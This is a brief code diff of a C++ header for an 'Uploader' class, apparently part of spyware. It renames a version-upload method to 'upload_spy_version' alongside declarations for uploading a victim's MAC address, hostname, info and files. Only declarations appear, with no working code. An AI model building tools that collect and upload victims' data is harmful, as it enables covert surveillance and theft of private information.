@@ -17,7 +17,7 @@ class Uploader
 	void upload_mac();
 	void upload_hostname();
 	void upload_victim_info();
-	void upload_version();
+	void upload_spy_version();
 	void upload_file_data(FILE * file);
 	void upload_file(FILE * file);
 public:
